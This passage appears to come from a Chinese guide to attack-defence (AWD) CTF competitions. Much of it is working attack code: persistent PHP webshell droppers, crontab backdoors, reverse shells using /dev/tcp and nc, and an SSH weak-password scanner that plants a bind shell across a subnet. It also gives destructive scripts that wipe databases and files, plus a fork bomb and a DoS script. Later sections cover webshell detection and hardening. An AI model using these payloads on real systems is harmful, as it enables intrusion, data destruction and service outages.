data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7")&#123;@eval($_REQUEST['</span>cmd<span class="token string single-quoted-string">']);&#125; ?>'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2018-12-01 09:10:12" shell2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>#passwd=y0range857</pre></td></tr><tr><td data-num="15"></td><td><pre>#POST传参：passwd=y0range857&amp;a=system('ls');</pre></td></tr></table></figure><p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 shell2.php 的 shell 文件，然后使用 caidao 输入 http://xxx/shell2.php?pass=pass 的路径，密码为 a 就可以链接一句话，由于 pass 是 md5 加密很难被破解也可以做到隐蔽，md5 值可以随意定义。</p><p>写入 shell， at.php 内容</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.login.php'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$file1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/admin/.register.php'</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7")&#123;@eval($_REQUEST["at"]);&#125; ?>'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2018-12-01 09:10:12" .login.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file1</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2018-12-01 09:10:12" /admin/.register.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>浏览器访问 at.php，会生成不死马 at2.php</p><figure class="highlight tex"><figcaption data-lang="TeX"></figcaption><table><tr><td data-num="1"></td><td><pre>url/upload/at.php</pre></td></tr></table></figure><p>再传入，执行命令，getshell</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>url/upload/at2.php?passwd<span class="token operator">=</span>obse007<span class="token operator">&amp;</span><span class="token assign-left variable">at</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h2 id="权限维持"><a class="anchor" href="#权限维持">#</a> 权限维持</h2><p>预留后门的权限维持特别重要，不要急着拿 flag，往后每一轮预留后门都会减少，未雨绸缪。<br><strong>crontab 定时任务</strong><br>1. 使用定时任务写马</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>system<span class="token punctuation">(</span><span class="token string">'echo "* * * * * echo \"&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\'</span>462d4a0e7cedd6b024a4d99f10c614d1<span class="token punctuation">\</span>'<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@eval<span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token punctuation">\</span>" <span class="token operator">></span> /var/www/html/.index.php<span class="token punctuation">\</span>n* * * * * <span class="token function">chmod</span> <span class="token number">777</span> /var/www/html/.index.php" <span class="token operator">|</span> <span class="token function">crontab</span><span class="token punctuation">;</span>whoami'<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>密码：atkx<br>来指定用户运行指定的定时任务</p><p>2. 使用定时任务发送带有 flag 的请求</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">bash</span><span class="token comment"># 编辑 crontab：crontab -e</span></pre></td></tr><tr><td data-num="2"></td><td><pre>*/5 * * * * <span class="token function">curl</span> <span class="token number">10.10</span>.10.5:8000/submit_flag/ -d <span class="token string">'flag='</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /home/web/flag/flag<span class="token variable">)</span></span><span class="token string">'&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 查询 crontab：crontab -l</span></pre></td></tr></table></figure><p>3. 使用定时任务反弹 shell</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">bash</span> -c <span class="token function">bash</span><span class="token string">'bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1'</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">nc</span> -e /bin/bash <span class="token number">1.3</span>.3.7 <span class="token number">4444</span> <span class="token function">bash</span></pre></td></tr></table></figure><p><strong>反弹 shell</strong><br>nc 反弹 shell</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/192.168.182.130/6666 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></pre></td></tr></table></figure><p>本地</p><pre><code>nc -l -p 6666
</code></pre><h2 id="软链接"><a class="anchor" href="#软链接">#</a> 软链接</h2><p>软连接语法：</p><pre><code>ln -s  [shell路径]   [新文件路径]
</code></pre><p>使用方法：<br>访问 /upload/new.php，实际上是访问 /upload/shell.php</p><pre><code>ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php
</code></pre><p>软连接利用</p><pre><code>root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css
root@086f12c38b93:~# cat /var/www/html/css/flag.css
SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;
</code></pre><p>然后访问 url/css/flag.css 即可得到 flag</p><h2 id="ssh弱密码利用"><a class="anchor" href="#ssh弱密码利用">#</a> SSH 弱密码利用</h2><pre><code>#-*- coding:utf-8 -*-
import paramiko
ip = '192.168.1.137'
port = '22'
username = 'root'
passwd = '123456'
# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd='cat /flag'):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        print(&quot;无结果!&quot;)
        result = stderr.read()
    ssh.close()
    return result.decode()
a = ssh_base_pwd(ip,port,username,passwd)
print(a)

#SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;
</code></pre><p>批量</p><pre><code>#-*- coding:utf-8 -*-
import paramiko
import threading
import queue
import time
#反弹shell python
q=queue.Queue()
#lock = threading.Lock()

# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        result = stderr.read()
    ssh.close()
    return result.decode()

def main(x):
    shell = '''
    #服务器端
    import socket
    import os
    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(('0.0.0.0',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量
    con,addr=s.accept()     #接受一个客户端的连接
    #print(con,addr)
    for i in range(10):
        cmd=con.recv(1024)
        print(cmd)
        command=cmd.decode()
        if command.startswith('cd'):
            os.chdir(command[2:].strip())   #切换路径
            result=os.getcwd()      #显示路径
        else:
            result=os.popen(command).read()
        if result:
            con.send(result.encode())
        else:
            con.send(b'OK!')
    '''
    cmd = 'echo \&quot;%s\&quot; &gt; ./shell.py' % (shell) +'&amp;&amp; python3 ./shell.py'
    port = '22'
    username = 'root'
    passwd = 'toor'

    ip = '192.168.1.&#123;&#125;'.format(x)
    q.put(ip.strip(),block=True, timeout=None)
    ip_demo=q.get()
    #判断是否成功
    try:
        #lock.acquire()
        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd='id')
        if res:
            print(&quot;[ + ]Ip: %s&quot; % ip_demo +&quot; is success!!! [ + ]&quot;)
            #lock.release()
            ssh_base_pwd(ip_demo,port,username,passwd,cmd)
    except:
        print(&quot;[ - ]Ip: %s&quot; % ip_demo +&quot; is Failed&quot;)
    if x &gt; 255:
        print(&quot;Finshed!!!!!!!!&quot;)
    q.task_done()

#线程队列部分
th=[]
th_num=255
for x in range(th_num):
        t=threading.Thread(target=main,args=(x,))
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()

#q.join()所有任务完成
</code></pre><h2 id="攻击搅屎"><a class="anchor" href="#攻击搅屎">#</a> 攻击搅屎</h2><p>无限复制</p><pre><code>&lt;?php
  set_time_limit(0);
  ignore_user_abort(true);
  while(1)&#123;
      file_put_contents(randstr().'.php',file_get_content(__FILE__));
      file_get_contents(&quot;http://127.0.0.1/&quot;);
  &#125;
?&gt;
</code></pre><p>修改数据库密码</p><pre><code>update mysql.user set authentication_string=PASSWORD('p4rr0t');# 修改所有用户密码
flush privileges;
UPDATE mysql.user SET User='aaaaaaaaaaaa' WHERE user='root'; 
flush privileges;
delete from mysql.user ;#删除所有用户
flush privileges;
</code></pre><p>重启 apache2 和 nigix</p><pre><code>#!/usr/bin/env sh
while [[ 1 ]]
do
    service apache2 stop
    service nginx stop
done &amp;
</code></pre><p>循环删除</p><pre><code>&lt;?php
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);
    function getfiles($path)&#123;
        foreach(glob($path) as $afile)&#123;
            if(is_dir($afile))
                getfiles($afile.'/*.php');
            else
                @file_put_contents($afile,&quot;#Anything#&quot;);
                //unlink($afile);
        &#125;
    &#125;
    while(1)&#123;
        getfiles(__DIR__);
        sleep(10);
    &#125;
?&gt;

&lt;?php
    set_time_limit(0);
    ignore_user_abort(1);
    array_map('unlink', glob(&quot;some/dir/*.php&quot;));
?&gt;
</code></pre><p>删除数据库</p><pre><code>#!/usr/bin/env python3
  import base64
  def rm_db(db_user,my_db_passwd):
      cmd = &quot;/usr/bin/mysql -h localhost -u%s %s -e '&quot;%(db_user,my_db_passwd)
      db_name = ['performance_schema','mysql','flag']
      for db in db_name:
          cmd += &quot;drop database %s;&quot;%db
      cmd += &quot;'&quot;
      return cmd
</code></pre><p>fork_bomb</p><pre><code>#!/bin/sh
/bin/echo '.() &#123; .|.&amp; &#125; &amp;&amp; .' &gt; /tmp/aaa;/bin/bash /tmp/aaa;
</code></pre><p>DOS 脚本（非必要最好不要用）</p><pre><code>import socket
import time
import threading

max=90000000
port=80                 #端口
host=&quot;192.168.92.154&quot;   #IP
page=&quot;/index.php&quot;

bag=(&quot;POST %s HTTP/1.1\r\n&quot;
    &quot;host: %s\r\n&quot;
    &quot;Content-Length: 1000000000\r\n&quot;
    &quot;Cookie: 1998\r\n&quot;
    &quot;\r\n&quot; % (page,host))

socks = []

def connect():
    global socks
    for i in range(0,max):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((host,port))
            s.send(bag.encode(&quot;utf-8&quot;))
            socks.append(s)
        except Exception as ex:
            time.sleep(1)

def send():
    global socks
    while True:
        for s in socks:
            try:
                print(&quot;攻击中....&quot;)
            except Exception as ex:
                socks.remove(s)
                s.close()
        time.sleep(0.1)

One = threading.Thread(target=connect,args=())
Two = threading.Thread(target=send,args=())
One.start()
Two.start()
</code></pre><h1 id="防守思路"><a class="anchor" href="#防守思路">#</a> 防守思路</h1><h2 id="基础查杀"><a class="anchor" href="#基础查杀">#</a> 基础查杀</h2><p>寻找最近 20 分钟修改过的文件</p><pre><code>find /var/www/html -name *.php -mmin -20
</code></pre><p>寻找行数最短的文件：</p><pre><code>find ./ -name '*.php' | xargs wc -l | sort -u
</code></pre><p>关键字查杀</p><pre><code>find . -name '*.php' | xargs grep -n 'eval('
find . -name '*.php' | xargs grep -n 'assert'
find . -name '*.php' | xargs grep -n 'system()'
</code></pre><p>查找命令执行函数</p><pre><code>find /var/www/html -name &quot;*.php&quot; |xargs egrep 'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('
</code></pre><h2 id="文件监控"><a class="anchor" href="#文件监控">#</a> 文件监控</h2><p>脚本</p><pre><code># -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'

Special_string = 'drops_log'  # 免死金牌
UNICODE_ENCODING = &quot;utf-8&quot;
INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = &#123;
    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
&#125;

def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):

    if noneToNull and value is None:
        return NULL

    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value

    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors=&quot;ignore&quot;)

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u'[!] getmd5_error : ' + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = &#123;&#125;
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path['bak'])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path['bak'])

if __name__ == '__main__':
    print u'---------start------------'
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u'[*] pre work end!'
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] webshell find : ' + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                    except Exception as e:
                        print u'[!] move webshell error, &quot;%s&quot; maybe is webshell.'%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : file move error: ' + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] file had be change : ' + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                        shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u'[!] move webshell error, &quot;%s&quot; maybe is webshell.'%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : done_diff: ' + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print '[*] ' + getUnicode(time.ctime())
</code></pre><p>运行</p><pre><code>python jiankong.py  /var/www/html
</code></pre><h2 id="alias起别名"><a class="anchor" href="#alias起别名">#</a> alias 起别名</h2><pre><code>alias cat=&quot;echo nothing&quot;
</code></pre><p>删除</p><pre><code>unalias -a
</code></pre><p>对方执行 cat /flag 命令的时候回显就是错误 flag</p><pre><code>alias cat=&quot;echo `date`|md5sum|cut -d ' ' -f1||&quot;
</code></pre><p>获取 flag 一般是 curl <span class="exturl" data-url="aHR0cDovL3h4eC5jb20vZmxhZy50eHQ=">http://xxx.com/flag.txt</span></p><pre><code>alias curl='echo fuckoff' #权限要求较低，可以在这里改成虚假的flag
# 或者
chmod -x curl #权限要求较高
/usr/bin curl路径
</code></pre><h2 id="杀不死马"><a class="anchor" href="#杀不死马">#</a> 杀不死马</h2><p>查看进程</p><pre><code>root@1177499f5b23:~# ps aux | grep www-data
www-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6690  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6693  0.0  0.4 315800  9056 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7170  0.0  0.6 316312 14100 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7239  0.0  0.6 316172 14020 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7526  0.0  0.4 315620  8364 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUND
root     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep --color=auto www-data
</code></pre><p>(1) 杀进程</p><pre><code>kill -9 对应的进程号
</code></pre><p>执行命令</p><pre><code>ps aux | grep www-data | awk '&#123;print $2&#125;' | xargs kill -9
ps aux | grep www-data | grep -v grep | awk '&#123;print $2&#125;' | xargs kill -9
</code></pre><p>原理</p><pre><code>ps aux
列出进程信息

grep www-data
在进程信息中找到需要杀死的进程

grep -v grep
在进程信息中剔除带grep的信息

awk ‘&#123;print $2&#125;’
提取字符串行内容的第2个字段，也就是当前示例的进程号

xargs kill -9
将进程号作为参数传递给kill -9这个命令
</code></pre><p>然后删除不死马文件</p><p>(2) 重启 php 等 web 服务，不推荐使用</p><pre><code>service php-fpm restart
</code></pre><p>(3) 用一个 ignore_user_abort (true) 脚本，一直竞争写入（断断续续）。usleep 要低于对方不死马设置的值。</p><pre><code>&lt;?php
while (1) &#123;
    $pid=1234;  #不死马进程
    @unlink('demo.php');
    exec('kill -9 $pid');
&#125;
?&gt;

&lt;?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.3.php';
    $code = 'hi springbird !';
    //pass=pass
    while (1)&#123;
        file_put_contents($file,$code);
        system('touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php');
    //    usleep(5000);
          usleep(1000);
    &#125;
?&gt;
</code></pre><p>(4) 创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php<br>循环创建</p><pre><code>#!/bin/bash
dire=&quot;/var/www/html/.base.php/&quot;
file=&quot;/var/www/html/.base.php&quot;
rm -rf $file
mkdir $dire
./xx.sh
</code></pre><h2 id="清除反弹shell"><a class="anchor" href="#清除反弹shell">#</a> 清除反弹 shell</h2><p>查看进程</p><pre><code>ps -ef / px -aux
</code></pre><p>出现 www-data 权限的 /bin/sh 一般为 nc</p><p>然后杀进程</p><pre><code>kill `ps -aux | grep www-data | grep apache2 | awk '&#123;print $2&#125;'`
</code></pre><h2 id="提权"><a class="anchor" href="#提权">#</a> 提权</h2><p>在 AWD 中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到 root 权限，如果直接给 root 权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。</p><p>关于提权，通常我们要根据 kernel 版本号找到对应的 poc，平时我们可以收集测试一些比较新的提权 poc，以备不时之需。</p><p>影响范围比较大的漏洞，可以用来提权：</p><pre><code>CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ) ：
DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务(系统崩溃)或者提升权限，获得系统的管理访问权限

CVE-2016-5195(脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64)) ：
低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限

CVE-2016-8655(Ubuntu 12.04、14.04，Debian 7、8) ：
条件竞争漏洞，可以让低权限的进程获得内核代码执行权限
POC：https://www.seebug.org/vuldb/ssvid-92567

CVE-2017-1000367(sudo本地提权漏洞 ) ：L
inux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。

CVE-2016-1247(Nginx权限提升漏洞) ：
Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。
POC：https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
</code></pre><h2 id="漏洞修复"><a class="anchor" href="#漏洞修复">#</a> 漏洞修复</h2><p>基本原则</p><ul><li>能修复的尽量修复；</li><li>不能修复的先注释源码，不影响页面显示再删除；</li><li>站点和对应的功能尽可能不宕机；</li></ul><p>技巧</p><ul><li>设置 waf，如 load_file；</li><li>对于一些成型的 CMS，找到相应版本号后，对其 diff；</li><li>修改弱口令用户；</li><li>对于觉得危险函数的地方直接使用 die ()；</li></ul><p>比如文件上传漏洞修复，可以在 upload 目录下写.htaccess 禁止 php 文件执行</p><pre><code>&lt;Directory &quot;/var/www/html/upload&quot;&gt;
Options -ExecCGI -Indexes
AllowOverride None
RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
php_flag engine off
&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;
deny from all
&lt;/FilesMatch&gt;
&lt;/Directory&gt;
</code></pre><p>一些修复技巧参考：<span class="exturl" data-url="aHR0cHM6Ly9xZnRtLmdpdGh1Yi5pby8yMDE5LzA4LzAzL0FXRC1CdWdzLUZpeC8=">https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/</span></p><h2 id="日志分析"><a class="anchor" href="#日志分析">#</a> 日志分析</h2><p>命令行动态查看日志</p><pre><code>tailf /var/log/apache2/access.log
</code></pre><p>还可以使用工具进行日志分析：<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvb3BlbnNvdXJjZS9kZXRhaWwvMTU=">LogForensics 腾讯实验室 /web 日志取证分析工具</span></p><p>日志的存放地址</p><pre><code>/var/log/apache2/
/usr/local/apache2/logs
/usr/nginx/logs/
</code></pre><p>为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。</p><pre><code>import requests
import time

def scan_attack():
    file=&#123;'shell.php','admin.php','web.php','login.php','1.php','index.php'&#125;
